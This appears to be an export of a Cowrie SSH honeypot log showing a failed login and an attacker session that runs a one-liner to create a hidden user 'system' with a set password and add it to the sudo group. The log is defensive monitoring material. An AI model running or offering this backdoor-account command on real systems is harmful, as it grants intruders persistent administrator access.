2023-11-27T04:04:03+0000	[-] Python Version 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]	Unnamed: 2	Unnamed: 3	Unnamed: 4
2023-12-03T06:59:48+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
2023-12-03T06:59:48+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
2023-12-03T06:59:49+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'nvidia' failed auth b'password'			
2023-12-03T06:59:49+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
2023-12-03T06:59:49+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost			
2023-12-03T06:59:49+0000	[HoneyPotSSHTransport,110,170.64.170.215] Connection lost after 2 seconds			
2023-12-03T06:59:50+0000	"[twisted.conch.ssh.session#info] Executing command ""b'apt update && apt install sudo curl -y && sudo"	us	era	"dd -m -p $(openssl passwd -1 TRyWZR7p) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system'"""
2023-12-03T06:59:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,109,185.196.10.78] CM	D:	ap	t update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 TRyWZR7p) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system
2023-12-03T06:59:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,109,185.196.10.78] CM	D:	op	enssl passwd -1 TRyWZR7p
2023-12-03T06:59:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,109,185.196.10.78] Ca	n'	t f	ind command openssl
2023-12-03T06:59:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,109,185.196.10.78] Co	mm	and	not found: openssl passwd -1 TRyWZR7p
2023-12-03T06:59:50+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-12-03T06:59:50+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
2023-12-03T06:59:50+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0			
2023-12-03T06:59:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,109,185.196.10.78] Ca	n'	t f	ind command apt
2023-12-03T06:59:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,109,185.196.10.78] Co	mm	and	not found: apt update
2023-12-03T06:59:50+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-12-03T06:59:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,109,185.196.10.78] Ca	n'	t f	ind command apt
2023-12-03T06:59:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,109,185.196.10.78] Co	mm	and	not found: apt install sudo curl -y
2023-12-03T06:59:50+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-12-03T06:59:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,109,185.196.10.78] Co	mm	and	found: sudo useradd -m -p  system
2023-12-03T06:59:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,109,185.196.10.78] Co	mm	and	found: sudo usermod -aG sudo system
